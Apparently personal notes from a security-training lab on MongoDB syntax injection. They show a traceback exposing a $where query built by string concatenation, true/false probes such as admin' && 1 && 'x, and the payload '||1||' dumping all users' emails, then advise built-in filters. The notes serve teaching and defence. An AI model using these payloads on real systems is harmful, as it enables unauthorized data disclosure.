## Finding Syntax Injection
Now that we have covered Operator Injection, let's take a look at a Syntax Injection example. A Python application is running to allow you to receive the email address of any username that is provided. To use the application, authenticate via SSH using `ssh syntax@10.10.110.21` along with the credentials below:
	![](Pasted%20image%2020241215145055.png)

Once authenticated, you can provide a username as input. Let's start by simply providing `admin`:
	![](Pasted%20image%2020241215145219.png)
We can start to test for Syntax Injection by simply injecting a `'` character, which will result in the error seen in the response below:

```shell
syntax@10.10.110.21's password: 
Please provide the username to receive their email:admin'    !!!
Traceback (most recent call last):
  File "/home/syntax/script.py", line 17, in <module>
    for x in mycol.find({"$where": "this.username == '" + username + "'"}):
  File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1248, in next
    if len(self.__data) or self._refresh():
  File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1165, in _refresh
    self.__send_message(q)
  File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1053, in __send_message
    operation, self._unpack_response, address=self.__address
  File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1272, in _run_operation
    retryable=isinstance(operation, message._Query),
  File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1371, in _retryable_read
    return func(session, server, sock_info, read_pref)
  File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1264, in _cmd
    sock_info, operation, read_preference, self._event_listeners, unpack_res
  File "/usr/local/lib/python3.6/dist-packages/pymongo/server.py", line 134, in run_operation
    _check_command_response(first, sock_info.max_wire_version)
  File "/usr/local/lib/python3.6/dist-packages/pymongo/helpers.py", line 180, in _check_command_response
    raise OperationFailure(errmsg, code, response, max_wire_version)
pymongo.errors.OperationFailure: Failed to call method, full error: {'ok': 0.0, 'errmsg': 'Failed to call method', 'code': 1, 'codeName': 'InternalError'}
Connection to 10.10.110.21 closed.
```

The following line in the error message shows us that there is Syntax Injection:

```shell
for x in mycol.find({"$where": "this.username == '" + username + "'"}):
```

We can see that the username variable is directly concatenated to the query string and that a JavaScript function is being executed in the find command, allowing us to inject into the syntax. In this case, we have verbose error messages to give us an indication that injection is possible. However, even without verbose error messages, we could test for Syntax Injection by providing both a false and true condition and seeing that the output differs, as shown in the example below:

```shell
ssh syntax@10.10.110.21
syntax@10.10.110.21's password: 
Please provide the username to receive their email:admin' && 0 && 'x  
Connection to 10.10.110.21 closed.

ssh syntax@10.10.110.21
syntax@10.10.110.21's password: 
Please provide the username to receive their email:admin' && 1 && 'x
admin@nosql.int
Connection to 10.10.110.21 closed.
```

## Exploiting Syntax Injection
Now that we have confirmed Syntax Injection, we can leverage this injection point to dump all email addresses. To do this, we want to ensure that the testing statement of the condition always evaluates to true. As we are injecting into the JavaScript, we can use the payload of  `'||1||'`. Let's use this to disclose sensitive information:

```shell
ssh syntax@10.10.110.21
syntax@10.10.110.21's password: 
Please provide the username to receive their email:admin'||1||'
admin@nosql.int
pcollins@nosql.int
jsmith@nosql.int
[...]
Connection to 10.10.110.21 closed.
```

![](Pasted%20image%2020241215150154.png)

### The Exception to the Rule
It is worth noting that for Syntax Injection to occur, the developer has to create custom JavaScript queries. The same function could be performed using the built-in filter functions where `['username' : username]` would return the same result but not be vulnerable to injection. As such, Syntax Injection is rare to find, as it means that the developers are not using the built-in functions and filters. While some complex queries might require direct JavaScript, it is always recommended to avoid this to prevent Syntax Injection. The example shown above is for MongoDB; for other NoSQL solutions, similar Syntax Injection cases may exist, but the actual syntax will be different.